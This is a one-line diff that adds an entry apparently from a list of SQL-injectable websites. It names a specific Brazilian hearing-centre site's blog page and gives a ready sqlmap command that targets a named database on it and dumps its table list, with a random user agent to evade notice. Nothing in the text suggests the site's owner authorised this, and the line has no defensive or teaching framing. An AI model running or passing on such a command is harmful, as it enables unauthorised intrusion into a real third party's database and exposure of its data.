@@ -1,0 +1,1 @@
+http://www.centroauditivoaudiopower.com.br/blog-detalhes.php?id=80 (GET)  # sqlmap.py -u http://www.centroauditivoaudiopower.com.br/blog-detalhes.php?id=80 -D centroauditivo06 --threads 5 -v3 --random-agent --tables
